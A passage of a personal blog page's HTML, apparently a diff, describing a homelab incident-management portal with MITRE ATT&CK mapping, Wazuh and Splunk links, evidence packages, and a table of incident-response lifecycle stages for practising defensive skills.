+<img src="../../assets/images/homelab-walkthrough/08-LabWatch.png" alt="The LabWatch incident management portal." width="1884" height="902" loading="lazy">
+<figcaption><span class="lab">Fig 8.</span> The LabWatch incident management portal.</figcaption>
+</figure>
+
+
+<p>This is the most exciting and rewarding part of the homelab. It allows me to address incidents using the mindset of a SOC analyst and not just an enthusiast. </p>
+<p>I even have knowledge base articles for recurring incidents and additional reference material:</p>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/09-KB.png" alt="LabWatch knowledge base articles and reference material." width="1890" height="908" loading="lazy">
+<figcaption><span class="lab">Fig 9.</span> LabWatch knowledge base articles and reference material.</figcaption>
+</figure>
+
+
+<p>The MITRE ATT&amp;CK framework is built-in to the incident response template:</p>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/10-MITRE.png" alt="MITRE ATT&amp;CK context in the incident response template." width="1654" height="902" loading="lazy">
+<figcaption><span class="lab">Fig 10.</span> MITRE ATT&amp;CK context in the incident response template.</figcaption>
+</figure>
+
+
+<p>Each INC has links to open the corresponding event in Wazuh or Splunk (including the correlated events):</p>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/10-INC.png" alt="Incident links to source events and correlated evidence in Wazuh and Splunk." width="1414" height="784" loading="lazy">
+<figcaption><span class="lab">Fig 11.</span> Incident links to source events and correlated evidence in Wazuh and Splunk.</figcaption>
+</figure>
+
+
+<p>The INC evidence package can be downloaded as a <code>.zip</code> file, containing the raw JSON event files and analyst commands used. </p>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/11-Evidence.png" alt="The downloadable incident evidence package." width="958" height="496" loading="lazy">
+<figcaption><span class="lab">Fig 12.</span> The downloadable incident evidence package.</figcaption>
+</figure>
+
+
+<p>There&#39;s also a MITRE framework coverage mapping:</p>
+<figure>
+<img src="../../assets/images/homelab-walkthrough/12-Framework.png" alt="MITRE framework coverage mapping in LabWatch." width="1582" height="686" loading="lazy">
+<figcaption><span class="lab">Fig 13.</span> MITRE framework coverage mapping in LabWatch.</figcaption>
+</figure>
+
+
+<hr>
+<h2>What&#39;s Next</h2>
+<p>I&#39;m sitting at the seat of an enterprise network SIEM generating hundreds to thousands of events per day. The high/severe/critical alerts ship to the custom LabWatch portal, where they are addressed and if necessary, followed up by a fine tuning rule to address any false positives. As I progress in adversary emulation TTPs, I will conduct attack/defend scenarios and log the entire process using a formal incident response template which is built in a way where I can further develop my BASH, PowerShell, networking, and Python skills:</p>
+<div class="table-scroll" tabindex="0" role="region" aria-label="Scrollable reference table">
+<table>
+<thead>
+<tr>
+<th>Gate</th>
+<th>Lifecycle stage</th>
+<th>Bash/Linux</th>
+<th>Python</th>
+<th>PowerShell</th>
+<th>Networking</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>G0</td>
+<td>Authorization and safety</td>
+<td>scope and snapshot notes</td>
+<td>-</td>
+<td>-</td>
+<td>-</td>
+</tr>
+<tr>
+<td>G1</td>
+<td>Baseline</td>
+<td>Linux host and service health</td>
+<td>health-check verdict</td>
+<td>Windows state and agent health export</td>
+<td>capture interface and filter ready</td>
+</tr>
+<tr>
+<td>G2</td>
+<td>Controlled attack</td>
+<td>attacker transcript with true exit state</td>
+<td>attack driver or verdict</td>
+<td>Windows-side attack, if any</td>
+<td>pcapng of the action</td>
+</tr>
+<tr>
+<td>G3</td>
+<td>Detection and triage</td>
+<td>Linux source events</td>
+<td>parse Wazuh archives and alerts by field</td>
+<td>Windows event XML by named field</td>
+<td>flow that confirms the network action</td>
+</tr>
+<tr>
+<td>G4</td>
+<td>Scope and attribution</td>
+<td>account and host enumeration</td>
+<td>correlate and join across sources</td>
+<td>process and identity lineage</td>
+<td>endpoints, direction, certificate, timing</td>
+</tr>
+<tr>
+<td>G5</td>
+<td>Containment and preservation</td>
+<td>Linux-side collection first</td>
+<td>evidence completeness check</td>
+<td>collection and containment action</td>
+<td>capture continuity across containment</td>
+</tr>
+<tr>
+<td>G6</td>
+<td>Remediation</td>
+<td>Linux config or credential fix</td>
+<td>verify residue is gone</td>
+<td>remove persistence or vulnerable condition</td>
+<td>confirm the channel is closed</td>
+</tr>
+<tr>
+<td>G7</td>
+<td>Recovery and validation</td>
+<td>service restore checks</td>
+<td>re-run verdict, attack should now fail</td>
+<td>service and telemetry validation</td>
+<td>confirm normal flow, attack path dead</td>
+</tr>
+<tr>
+<td>G8</td>
+<td>Review and improvement</td>
+<td>evidence hashing and inventory completion</td>
+<td>metrics computation</td>
+<td>detection tuning export</td>
+<td>annotated capture for the report</td>
+</tr>
+</tbody></table>
+</div>
+
+    </article>
+  </div>
+  </main>
+
+  <footer>
+    <div class="grid">
+      <div class="rail"><span>about</span></div>
+      <div class="colophon">
+        <p class="fine">
+          <a href="https://github.com/purplepyram1d">github</a> &middot;
+          <a href="https://www.linkedin.com/in/johnnymeintel">linkedin</a><br>
+          <a href="../../index.html">&larr; contents</a>
+        </p>
+      </div>
+    </div>
+  </footer>
+
+</div>
+</body>
+</html>
